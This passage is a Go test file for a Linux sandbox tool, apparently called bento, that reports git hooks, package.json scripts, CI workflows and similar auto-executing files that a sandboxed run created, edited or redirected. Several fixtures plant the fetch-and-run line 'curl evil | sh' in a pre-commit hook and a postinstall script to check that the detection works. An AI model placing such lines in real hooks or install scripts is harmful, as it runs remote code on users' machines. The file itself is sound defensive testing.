//go:build linux

package linux

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/whiskeyjimbo/bento/enforce"
	"github.com/whiskeyjimbo/bento/policy"
)

// The report exists to point a reviewer at the auto-executing files a run touched, so
// every way a run can touch one has to reach the list: an edit, a create, and a delete.
// A snapshot that only recorded what existed before would miss the last two, which are
// the shapes that plant and unplant a hook.
func TestChangedAutoExecNamesEveryKindOfChange(t *testing.T) {
	grant := t.TempDir()
	write := func(rel, body string) string {
		p := filepath.Join(grant, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		return p
	}
	edited := write("package.json", `{"scripts":{}}`)
	removed := write("conftest.py", "import pytest\n")
	untouched := write("build.rs", "fn main() {}\n")
	workflow := write(".github/workflows/ci.yml", "on: push\n")

	before := baselineAutoExec([]string{grant})

	// A same-size rewrite is invisible to a size compare alone, so the edit keeps the
	// length and moves only the mtime - the half of the stamp a test writing a longer
	// string would never exercise.
	if err := os.WriteFile(edited, []byte(`{"scripts":{"postinstall":"x"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chtimes(workflow, time.Time{}, time.Now().Add(time.Second)); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(removed); err != nil {
		t.Fatal(err)
	}
	created := write(".husky/pre-commit", "#!/bin/sh\ncurl evil | sh\n")

	got, _, _ := before.changed([]string{grant})
	want := []string{created, edited, removed, workflow}
	slices.Sort(want)
	if !slices.Equal(got, want) {
		t.Errorf("changed = %v, want %v", got, want)
	}
	if slices.Contains(got, untouched) {
		t.Errorf("%s was not changed but is reported", untouched)
	}
}

// The whole point of resolving core.hooksPath is the value nobody hard-codes, so the
// test uses one: a directory of the repo's own naming, reached only because git was
// asked. The absolute case is the one seen in the wild - a hooks dir in another checkout
// entirely - and it must be dropped, because a path outside every write grant is not one
// the run could have planted.
func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
	grant := t.TempDir()
	elsewhere := t.TempDir()
	git := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = grant
		cmd.Env = slices.DeleteFunc(os.Environ(), func(kv string) bool {
			return strings.HasPrefix(kv, "GIT_")
		})
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v: %s", args, err, out)
		}
	}
	git("init", "-q")
	git("config", "core.hooksPath", "scripts/githooks")
	inTree := filepath.Join(grant, "scripts", "githooks")
	if err := os.MkdirAll(inTree, 0o755); err != nil {
		t.Fatal(err)
	}

	// bento is reachable from inside a hook or a `git rebase --exec`, which export
	// GIT_DIR. It overrides cmd.Dir outright, so an inherited one would resolve some
	// other repo's hooks and silently report on a directory this grant never had.
	t.Setenv("GIT_DIR", filepath.Join(elsewhere, "decoy.git"))

	before := baselineAutoExec([]string{grant})
	planted := filepath.Join(inTree, "pre-commit")
	if err := os.WriteFile(planted, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got, _, _ := before.changed([]string{grant}); !slices.Equal(got, []string{planted}) {
		t.Errorf("changed = %v, want %v", got, []string{planted})
	}

	git("config", "core.hooksPath", filepath.Join(elsewhere, "hooks"))
	if err := os.MkdirAll(filepath.Join(elsewhere, "hooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	before = baselineAutoExec([]string{grant})
	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "pre-commit"), []byte("x\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
		t.Errorf("a hooks dir outside every write grant is out of scope, got %v", got)
	}

	// core.hooksPath is fixed for the run, but the directory it names is an ordinary
	// project path the run can replace with a symlink. Judged by name alone that stays
	// inside the grant, and the after-snapshot walks wherever it points - which would
	// let a run fill its own report with host files it never touched.
	git("config", "core.hooksPath", "scripts/githooks")
	if err := os.RemoveAll(inTree); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(elsewhere, "hooks"), inTree); err != nil {
		t.Fatal(err)
	}
	before = baselineAutoExec([]string{grant})
	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "post-commit"), []byte("x\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
		t.Errorf("a hooks dir symlinked out of the grant is out of scope, got %v", got)
	}
}

// A write grant with no enclosing checkout has no .git for the shields to hold down, so
// core.hooksPath is not fixed for the run by anything the shields do: the target can git
// init inside the grant and point it at another write grant. The baseline resolving it
// once, before the target runs, is what keeps the after-snapshot from walking wherever the
// run just pointed it and reporting a directory it never touched as newly created.
func TestARunCreatedHooksPathDoesNotWidenTheReport(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	grant := t.TempDir()
	other := t.TempDir()
	if err := os.WriteFile(filepath.Join(other, "already-here"), []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	// No repo anywhere above the grant, which is the whole point: nothing is shielded.
	writes := []string{grant, other}
	before := baselineAutoExec(writes)

	git := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = grant
		cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	git("init", "-q")
	git("config", "core.hooksPath", other)

	// The directory, and only the directory. Naming the files inside it would report a
	// pre-existing file as newly created, since the baseline never stamped it; naming
	// nothing would leave the operator unaware that the run chose where the host's next
	// commit executes from. It travels apart from the changed FILES, because the run need
	// never have written anything in there for the redirection to be worth saying.
	changed, redirected, _ := before.changed(writes)
	if !slices.Equal(redirected, []string{other}) {
		t.Errorf("redirected = %v, want just the redirected hooks directory %v", redirected, []string{other})
	}
	if len(changed) != 0 {
		t.Errorf("the run changed no auto-executing file, but changed = %v", changed)
	}
	if slices.Contains(redirected, filepath.Join(other, "already-here")) {
		t.Error("a file the baseline never stamped must not be reported as one the run created")
	}
}

// The same redirection reached the other way: no repo above the grant, so the run makes
// one and its .git/hooks becomes the host's hook directory. There was no .git at
// preflight, so gitDirShields carved nothing and no shield holds it down - which is
// exactly why the report has to name it.
func TestHooksInARunCreatedRepoAreReported(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	grant := t.TempDir()
	writes := []string{grant}
	before := baselineAutoExec(writes)

	cmd := exec.Command("git", "init", "-q")
	cmd.Dir = grant
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git init: %v\n%s", err, out)
	}
	if err := os.WriteFile(filepath.Join(grant, ".git", "hooks", "pre-commit"), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	changed, redirected, _ := before.changed(writes)
	if !slices.Contains(redirected, filepath.Join(grant, ".git", "hooks")) {
		t.Errorf("a hooks directory the run created must be named; got %v", redirected)
	}
	if slices.Contains(changed, filepath.Join(grant, ".git", "hooks")) {
		t.Errorf("the directory is not a changed file and must not be reported as one; got %v", changed)
	}
}

// The blind spots are deliberate and documented on enforce.Result.ChangedAutoExec, so
// they are pinned: a widening that closes one should be a decision someone made, and a
// narrowing that opens a new one should fail here rather than silently drop a hint.
func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
	grant := t.TempDir()
	nested := filepath.Join(grant, "packages", "web")
	if err := os.MkdirAll(nested, 0o755); err != nil {
		t.Fatal(err)
	}
	before := baselineAutoExec([]string{grant})
	if err := os.WriteFile(filepath.Join(nested, "package.json"), []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
		t.Errorf("a nested package.json is out of scope by construction, got %v", got)
	}

	// A grant that is a plain file, or names nothing on this host, must not panic or
	// invent a change - resolveGrants admits both shapes.
	missing := filepath.Join(grant, "not-there")
	file := filepath.Join(grant, "setup.py")
	if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	before = baselineAutoExec([]string{missing, file})
	if got, redirected, _ := before.changed([]string{missing, file}); len(got)+len(redirected) != 0 {
		t.Errorf("an unchanged run reported %v", got)
	}
}

// The snapshot is only worth anything if a real run carries it into the Result, and the
// two halves are wired separately - the baseline before the target starts, the compare
// after it exits. A unit test of changedAutoExec passes with either end unhooked.
func TestRunReportsTheAutoExecFilesTheTargetChanged(t *testing.T) {
	requireSandbox(t)

	dir := t.TempDir()
	touched := filepath.Join(dir, "package.json")
	if err := os.WriteFile(touched, []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	left := filepath.Join(dir, "conftest.py")
	if err := os.WriteFile(left, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	script := filepath.Join(dir, "p.sh")
	if err := os.WriteFile(script, []byte(`echo '{"scripts":{"postinstall":"curl evil | sh"}}' > `+touched+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	p := &policy.Policy{Entrypoint: script, Interpreter: "sh", Write: []string{dir}, Exec: policy.ExecAll}

	res, err := sandboxEnforcer(t).Run(context.Background(), p, enforce.Process{}, enforce.RunOptions{})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !slices.Contains(res.ChangedAutoExec, touched) {
		t.Errorf("the run rewrote %s but the result does not report it; ChangedAutoExec=%v", touched, res.ChangedAutoExec)
	}
	if slices.Contains(res.ChangedAutoExec, left) {
		t.Errorf("%s was untouched but is reported; ChangedAutoExec=%v", left, res.ChangedAutoExec)
	}
}

// The degraded tier has its own baseline and its own compare, wired at three separate
// points, and the unit test above passes with either end of that pair dead. It is also
// the tier with no mount namespace and no shields at all, so it is where a missing hint
// costs most. Driven through runDegraded directly, as the other degraded tests are: a
// userns-capable host would otherwise take the bwrap path.
func TestDegradedRunReportsTheAutoExecFilesTheTargetChanged(t *testing.T) {
	requireDegraded(t)

	dir := t.TempDir()
	touched := filepath.Join(dir, "package.json")
	if err := os.WriteFile(touched, []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	left := filepath.Join(dir, "build.rs")
	if err := os.WriteFile(left, []byte("fn main() {}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	script := filepath.Join(dir, "p.sh")
	if err := os.WriteFile(script, []byte(`echo '{"scripts":{"postinstall":"curl evil | sh"}}' > `+touched+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	p := &policy.Policy{Entrypoint: script, Interpreter: "sh", Write: []string{dir}, Exec: policy.ExecAll}

	var out strings.Builder
	res, err := enforcerUsing(testBento(t)).runDegraded(context.Background(), p,
		enforce.Process{Stdout: &out, Stderr: &out}, enforce.RunOptions{})
	if err != nil {
		t.Fatalf("runDegraded: %v\noutput:\n%s", err, out.String())
	}
	if !slices.Contains(res.ChangedAutoExec, touched) {
		t.Errorf("the degraded run rewrote %s but the result does not report it; ChangedAutoExec=%v\noutput:\n%s", touched, res.ChangedAutoExec, out.String())
	}
	if slices.Contains(res.ChangedAutoExec, left) {
		t.Errorf("%s was untouched but is reported; ChangedAutoExec=%v", left, res.ChangedAutoExec)
	}
}

// git printing an empty answer for the hooks path. The value decides which directory the
// snapshot walks, and joining an empty one against the grant would make the grant root
// itself the hook directory - a whole checkout reported as auto-executing files. An answer
// that cannot be read is the grant's hook directory unseen, so it is an error the caller
// reports as unresolved, not an empty answer that reads like a checkout with none.
func TestAnEmptyGitAnswerNamesNoHookDir(t *testing.T) {
	shim := t.TempDir()
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\necho\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	grant := t.TempDir()
	got, err := hookRunnerDir(grant, []string{resolved(grant)})
	if got != "" {
		t.Errorf("hookRunnerDir = %q, want no answer; an empty git answer named a directory", got)
	}
	if err == nil {
		t.Error("hookRunnerDir returned no error for an answer it could not read, so the grant reads as having no hook directory")
	}
}

// A git that does not answer must not read like a checkout with no hook directory: the
// hook report is empty either way, and only the unresolved list says which happened.
func TestAGitThatCannotAnswerNamesTheGrant(t *testing.T) {
	shim := t.TempDir()
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\nexit 127\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	grant := t.TempDir()

	if _, err := hookRunnerDir(grant, []string{resolved(grant)}); err == nil {
		t.Error("hookRunnerDir returned no error for a git exiting 127")
	}
	hooks, unresolved := hookRunnerDirs([]string{grant})
	if len(hooks) != 0 {
		t.Errorf("hookRunnerDirs named %v, want none; git could not answer", hooks)
	}
	if !slices.Contains(unresolved, grant) {
		t.Errorf("unresolved = %v, want it to name %s", unresolved, grant)
	}
	if _, _, unresolved := baselineAutoExec([]string{grant}).changed([]string{grant}); !slices.Contains(unresolved, grant) {
		t.Errorf("changed reported unresolved = %v, want it to name %s", unresolved, grant)
	}
}

// A git that never returns must not hang the preflight: the deadline is what turns an
// unresponsive object store into a reported failure instead of a run that never starts.
func TestAGitThatNeverAnswersIsBounded(t *testing.T) {
	shim := t.TempDir()
	// An absolute sleep: PATH is about to become the shim directory alone, and a bare
	// name would exit 127 and answer the test with the wrong failure.
	sleep, err := exec.LookPath("sleep")
	if err != nil {
		t.Skipf("no sleep on this host: %v", err)
	}
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\nexec "+sleep+" 30\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	hookResolveTimeout = 100 * time.Millisecond
	t.Cleanup(func() { hookResolveTimeout = 5 * time.Second })

	grant := t.TempDir()
	done := make(chan error, 1)
	go func() {
		_, err := hookRunnerDir(grant, []string{resolved(grant)})
		done <- err
	}()
	select {
	case err := <-done:
		if err == nil {
			t.Error("hookRunnerDir returned no error for a git that never answered")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("hookRunnerDir did not return: the hook resolution has no deadline")
	}
}

// A path that cannot be walked is compared as written, whatever the reason. EvalSymlinks
// needs the same traversal the stamping ReadDir needs, so a name it cannot resolve is one
// nothing else walks either - and answering "" there would collapse the containment test
// onto the grant root.
func TestAnUnresolvablePathIsComparedAsWritten(t *testing.T) {
	dir := t.TempDir()
	dangling := filepath.Join(dir, "link")
	if err := os.Symlink(filepath.Join(dir, "nothing-here"), dangling); err != nil {
		t.Fatal(err)
	}
	if got := resolved(dangling); got != dangling {
		t.Errorf("resolved = %q, want the path as written", got)
	}
}

// The after-run snapshot is the last thing Run does with the write grants, with the
// target already exited and the sandbox torn down. Unbounded, a grant whose mount died
// during the run - after the deadMount gate let the launch through - blocks Run forever
// there, with no output and no exit. The baseline was wrapped against exactly this on
// both tiers and the re-ask was not carried along.
func TestTheAfterRunAutoExecSnapshotIsBounded(t *testing.T) {
	grant := t.TempDir()
	if err := os.WriteFile(filepath.Join(grant, "package.json"), []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	before := baselineAutoExec([]string{grant})

	setWalkTimeout(t, 100*time.Millisecond)
	hung := make(chan struct{})
	t.Cleanup(func() { close(hung) })
	real := autoExecStat
	autoExecStat = func(p string) (os.FileInfo, error) { <-hung; return real(p) }
	t.Cleanup(func() { autoExecStat = real })

	done := make(chan []string, 1)
	go func() {
		changed, _, unresolved := before.changed([]string{grant})
		done <- append(changed, unresolved...)
	}()
	select {
	case got := <-done:
		// The grant is named unresolved rather than its files reported changed: an
		// expired snapshot is empty, and comparing an empty one against the baseline
		// would report every file the baseline stamped as removed by the run - a report
		// invented out of a mount that stopped answering.
		if !slices.Equal(got, []string{grant}) {
			t.Errorf("changed+unresolved = %v, want just the grant %q; a snapshot that never answered must make the report short, not fabricate one", got, grant)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("changed() never returned: a write grant whose mount died during the run hangs Run after the target has exited, with nothing left to print")
	}
}

// resolved is reached from hookRunnerDir after its bounded git call has returned, and
// again from changed()'s redirect question. EvalSymlinks lstats every component, so a
// hook directory on a dead mount blocks it exactly as thoroughly as the git call the
// bound beside it exists for.
func TestResolvedIsBounded(t *testing.T) {
	setWalkTimeout(t, 100*time.Millisecond)
	hung := make(chan struct{})
	t.Cleanup(func() { close(hung) })
	real := evalSymlinks
	evalSymlinks = func(p string) (string, error) { <-hung; return real(p) }
	t.Cleanup(func() { evalSymlinks = real })

	done := make(chan string, 1)
	go func() { done <- resolved("/export/checkout/.git/hooks") }()
	select {
	case got := <-done:
		if got != "/export/checkout/.git/hooks" {
			t.Errorf("resolved = %q, want the path itself - the answer it already gives for a path it cannot walk", got)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("resolved never returned: a hook directory on a dead mount hangs the run there")
	}
}

// git is a dependency of the hook report with no probe behind it: hookRunnerDir shells
// to `git rev-parse` and every other binary this package shells to is probed at
// admission. Unprobed, a host with no git gives a clean doctor report and then every run
// names its grants unresolved - which is also what one unreadable checkout looks like,
// so nothing says the host can never answer.
func TestTheAutoExecReportLayerReportsAHostWithNoGit(t *testing.T) {
	if got := autoExecReportLayer(); got.State != enforce.Enforced {
		t.Fatalf("autoExecReportLayer on a host with git = %v, want enforced", got)
	}

	// A PATH with nothing on it: the layer answers for the host, so the question is
	// whether git can be found at all, not whether some shim answers.
	t.Setenv("PATH", t.TempDir())
	got := autoExecReportLayer()
	if got.State != enforce.Unavailable {
		t.Fatalf("autoExecReportLayer with no git on PATH = %v, want unavailable", got.State)
	}
	if !strings.Contains(got.Reason, "git") || got.Consequences == "" {
		t.Errorf("autoExecReportLayer reason = %q, consequences = %q; both have to name what the missing binary costs the report", got.Reason, got.Consequences)
	}
	// Hardening, and required by no policy: the report it degrades is a hint, and gating
	// a run or doctor's exit code on it would refuse work over a missing hint.
	if got.Layer.Tier() != enforce.TierHardening {
		t.Errorf("%s is tier %v, want hardening - a core layer refuses every run on a host with no git", got.Layer, got.Layer.Tier())
	}
	if !got.Layer.ReportOnly() {
		t.Errorf("%s is a layer a manifest can require, so a host with no git would refuse runs over a missing hint", got.Layer)
	}

	// Through Probe, not just the function: doctor renders the report, so a layer the
	// probe never adds is a row nobody sees, and asserting the function alone stays green
	// with the call site deleted.
	var reported bool
	for _, l := range New().Probe(context.Background()).Layers {
		reported = reported || l.Layer == enforce.LayerAutoExecReport
	}
	if !reported {
		t.Error("Probe reported no auto-exec-report layer, so doctor's table has no row for it and a host with no git still reads as clean")
	}
}

// Every grant's hook directory is tested for containment against every write grant, and
// resolving the grants inside that test made one pass cost W^2 symlink resolutions - 57,840
// at 240 grants whose hook directory is under none of them. The grants are resolved once
// per pass, so eight times the grants must cost about eight times the resolutions. The
// hook directory sits under no grant, which is the shape that runs the containment test to
// the end: a match on an early grant would stop it and hide the cost.
func TestHookRunnerDirsResolvesEachGrantOncePerPass(t *testing.T) {
	shim := t.TempDir()
	hooks := filepath.Join(t.TempDir(), "hooks")
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\nprintf 'true\\nfalse\\n/nonexistent/.git\\n%s\\n' "+hooks+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	calls := 0
	real := evalSymlinks
	evalSymlinks = func(p string) (string, error) { calls++; return real(p) }
	t.Cleanup(func() { evalSymlinks = real })

	checkout := t.TempDir()
	resolutions := func(n int) int {
		var writes []string
		for i := range n {
			w := filepath.Join(checkout, fmt.Sprintf("g%d", i))
			if err := os.MkdirAll(w, 0o755); err != nil {
				t.Fatal(err)
			}
			writes = append(writes, w)
		}
		calls = 0
		got, unresolved := hookRunnerDirs(writes)
		if len(got) != 0 || len(unresolved) != 0 {
			t.Fatalf("hookRunnerDirs = %v, unresolved %v; the fixture needs a hook directory under no grant", got, unresolved)
		}
		return calls
	}
	small, large := resolutions(8), resolutions(64)
	t.Logf("symlink resolutions per pass: %d at 8 grants, %d at 64", small, large)
	if ratio := float64(large) / float64(small); ratio > 8.5 {
		t.Errorf("eight times the write grants cost %.1fx the symlink resolutions (%d -> %d); each grant should be resolved once per pass, not once per grant it is compared against", ratio, small, large)
	}
}

// gitIn runs real git in dir with GIT_* dropped, as hookRunnerDir does.
func gitIn(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = slices.DeleteFunc(os.Environ(), func(kv string) bool {
		return strings.HasPrefix(kv, "GIT_")
	})
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v in %s: %v: %s", args, dir, err, out)
	}
	return strings.TrimSpace(string(out))
}

// git answers relative to the directory it actually runs in, which is the grant with its
// symlinks resolved. Joined lexically onto a grant spelled through a symlink, the answer's
// ".." steps climb out of the link's parent instead and name a directory git never runs
// hooks from - here one inside the checkout's own grant, so it reaches the report.
func TestASymlinkedGrantResolvesItsHookDir(t *testing.T) {
	repo := filepath.Join(t.TempDir(), "r")
	if err := os.MkdirAll(filepath.Join(repo, "a", "b"), 0o755); err != nil {
		t.Fatal(err)
	}
	gitIn(t, repo, "init", "-q")
	gitIn(t, repo, "config", "core.hooksPath", "a/hooks")
	link := filepath.Join(repo, "lnk")
	if err := os.Symlink(filepath.Join("a", "b"), link); err != nil {
		t.Fatal(err)
	}
	want := []string{filepath.Join(resolved(repo), "a", "hooks")}
	if got, unresolved := hookRunnerDirs([]string{link, repo}); !slices.Equal(got, want) || len(unresolved) != 0 {
		t.Errorf("hookRunnerDirs = %v, unresolved %v; want %v", got, unresolved, want)
	}
}

// Grants inside one checkout share one git answer, so a pass asks git once for them rather
// than once each: 240 write grants in a checkout were 240 execs for a single directory.
func TestHookRunnerDirsAsksGitOncePerCheckout(t *testing.T) {
	shim := t.TempDir()
	count := filepath.Join(t.TempDir(), "count")
	hooks := filepath.Join(t.TempDir(), "hooks")
	script := "#!/bin/sh\necho >>" + count + "\nprintf 'true\\nfalse\\n/nonexistent/.git\\n%s\\n' " + hooks + "\n"
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	checkout := t.TempDir()
	if err := os.Mkdir(filepath.Join(checkout, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	var writes []string
	for i := range 8 {
		w := filepath.Join(checkout, fmt.Sprintf("g%d", i), "deeper")
		if err := os.MkdirAll(w, 0o755); err != nil {
			t.Fatal(err)
		}
		writes = append(writes, w)
	}
	hookRunnerDirs(writes)
	out, err := os.ReadFile(count)
	if err != nil {
		t.Fatal(err)
	}
	if execs := strings.Count(string(out), "\n"); execs != 1 {
		t.Errorf("hookRunnerDirs ran git %d times for %d grants in one checkout, want 1", execs, len(writes))
	}
}

// Sharing an answer is only sound where git itself would give the same one, and git's
// discovery stops at the first .git of any kind on the way up. Each case puts a second
// repository between a grant and the checkout around it - a nested checkout, a linked
// worktree's .git file, a submodule's .git file, a bare repository, a .git file whose
// repository sets core.worktree to the enclosing directory - and the inner hook directory inside a grant,
// so a shared answer that is wrong still survives containment and shows. The oracle is
// real git asked once per grant.
func TestHookRunnerDirsAgreesWithGitPerGrant(t *testing.T) {
	// distinct is how many hook directories git names, which the fixture has to reach for a
	// wrong shared answer to be visible at all.
	type fixture struct {
		distinct int
		build    func(t *testing.T, root string) []string
	}
	cases := map[string]fixture{
		"relative hooksPath at different depths": {1, func(t *testing.T, root string) []string {
			gitIn(t, root, "init", "-q")
			gitIn(t, root, "config", "core.hooksPath", "tools/hooks")
			return mkdirs(t, root, ".", "a/b/c", "d")
		}},
		"nested checkout": {2, func(t *testing.T, root string) []string {
			gitIn(t, root, "init", "-q")
			grants := mkdirs(t, root, ".", "x", "inner/y")
			gitIn(t, filepath.Join(root, "inner"), "init", "-q")
			return grants
		}},
		"linked worktree": {2, func(t *testing.T, root string) []string {
			gitIn(t, root, "init", "-q")
			m := filepath.Join(root, "m")
			if err := os.Mkdir(m, 0o755); err != nil {
				t.Fatal(err)
			}
			gitIn(t, m, "init", "-q")
			gitIn(t, m, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "init")
			gitIn(t, m, "worktree", "add", "-q", filepath.Join(root, "wt"))
			return mkdirs(t, root, ".", "x", "wt/sub")
		}},
		"submodule": {2, func(t *testing.T, root string) []string {
			upstream := t.TempDir()
			gitIn(t, upstream, "init", "-q")
			gitIn(t, upstream, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "init")
			gitIn(t, root, "init", "-q")
			gitIn(t, root, "-c", "protocol.file.allow=always", "submodule", "add", "-q", upstream, "sub")
			return mkdirs(t, root, ".", "x", "sub/d")
		}},
		"bare repository": {2, func(t *testing.T, root string) []string {
			gitIn(t, root, "init", "-q")
			gitIn(t, root, "init", "-q", "--bare", filepath.Join(root, "b.git"))
			return mkdirs(t, root, ".", "x", "b.git/objects")
		}},
		"core.worktree": {2, func(t *testing.T, root string) []string {
			gitIn(t, root, "init", "-q")
			gd := filepath.Join(root, "gd")
			gitIn(t, root, "init", "-q", "--bare", gd)
			gitIn(t, gd, "config", "core.bare", "false")
			gitIn(t, gd, "config", "core.worktree", root)
			grants := mkdirs(t, root, ".", "y", "w/x")
			if err := os.WriteFile(filepath.Join(root, "w", ".git"), []byte("gitdir: "+gd+"\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			return grants
		}},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			grants := c.build(t, t.TempDir())
			var resolvedWrites, want []string
			for _, g := range grants {
				resolvedWrites = append(resolvedWrites, resolved(g))
			}
			for _, g := range resolvedWrites {
				dir := gitIn(t, g, "rev-parse", "--git-path", "hooks")
				if !filepath.IsAbs(dir) {
					dir = filepath.Join(g, dir)
				}
				dir = resolved(dir)
				for _, w := range resolvedWrites {
					if rel, err := filepath.Rel(w, dir); err == nil && rel != ".." && !strings.HasPrefix(rel, "../") {
						if !slices.Contains(want, dir) {
							want = append(want, dir)
						}
						break
					}
				}
			}
			if len(want) != c.distinct {
				t.Fatalf("git names %v, want %d directories; the fixture no longer puts each one in scope", want, c.distinct)
			}
			got, unresolved := hookRunnerDirs(grants)
			if !slices.Equal(got, want) || len(unresolved) != 0 {
				t.Errorf("hookRunnerDirs = %v, unresolved %v; git asked per grant says %v", got, unresolved, want)
			}
		})
	}
}

// Inside a git directory git answers a relative core.hooksPath as configured, relative to
// where hooks run rather than to the directory asked from. Joined onto the grant it named a
// directory inside .git that git never runs hooks from, and which one depended on the grant
// that asked first under the shared discovery stop - so the grants are tried in both orders.
func TestAGrantInsideAGitDirFindsTheHooksGitRuns(t *testing.T) {
	root := t.TempDir()
	r := filepath.Join(root, "r")
	gitIn(t, root, "init", "-q", r)
	gitIn(t, r, "config", "core.hooksPath", "a/hooks")
	// Where githooks(5) says a non-bare repository's hooks run from: the work tree.
	wantR := resolved(filepath.Join(r, gitIn(t, r, "rev-parse", "--git-path", "hooks")))

	b := filepath.Join(root, "b.git")
	gitIn(t, root, "init", "-q", "--bare", b)
	gitIn(t, b, "config", "core.hooksPath", "a/hooks")
	// And a bare one's: the git directory.
	wantB := resolved(filepath.Join(b, gitIn(t, b, "rev-parse", "--git-path", "hooks")))

	grants := []string{filepath.Join(r, ".git", "objects"), filepath.Join(r, ".git"), r, filepath.Join(b, "objects"), b}
	reversed := slices.Clone(grants)
	slices.Reverse(reversed)
	for _, order := range [][]string{grants, reversed} {
		got, unresolved := hookRunnerDirs(order)
		slices.Sort(got)
		want := []string{wantR, wantB}
		slices.Sort(want)
		if !slices.Equal(got, want) || len(unresolved) != 0 {
			t.Errorf("grants %v: hookRunnerDirs = %v, unresolved %v; git runs hooks from %v", order, got, unresolved, want)
		}
	}
}

// Outside its work tree git answers a relative core.hooksPath as configured, and a git
// directory whose work tree it cannot name from there leaves the value nothing to be
// relative to. Each grant is reported unresolved rather than given a directory git never
// runs hooks from - in either order, since grants under one git directory share an answer.
func TestAGrantWhoseWorkTreeGitCannotNameIsUnresolved(t *testing.T) {
	commit := func(t *testing.T, dir string) {
		gitIn(t, dir, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "init")
	}
	cases := map[string]func(t *testing.T, root string) []string{
		"linked worktree": func(t *testing.T, root string) []string {
			m := filepath.Join(root, "m")
			gitIn(t, root, "init", "-q", m)
			commit(t, m)
			gitIn(t, m, "worktree", "add", "-q", filepath.Join(root, "wt"))
			gitIn(t, m, "config", "core.hooksPath", "a/hooks")
			return []string{filepath.Join(m, ".git", "worktrees", "wt")}
		},
		// git answers --is-inside-git-dir false from a submodule's git directory itself,
		// since its core.worktree is set, and true from beneath it.
		"submodule": func(t *testing.T, root string) []string {
			up := filepath.Join(root, "up")
			gitIn(t, root, "init", "-q", up)
			commit(t, up)
			m := filepath.Join(root, "m")
			gitIn(t, root, "init", "-q", m)
			gitIn(t, m, "-c", "protocol.file.allow=always", "submodule", "add", "-q", up, "sub")
			gd := filepath.Join(m, ".git", "modules", "sub")
			gitIn(t, gd, "config", "core.hooksPath", "a/hooks")
			return []string{gd, filepath.Join(gd, "objects")}
		},
		// A .git whose core.worktree is elsewhere: its parent is not where hooks run.
		"core.worktree elsewhere": func(t *testing.T, root string) []string {
			x := filepath.Join(root, "x")
			gitIn(t, root, "init", "-q", x)
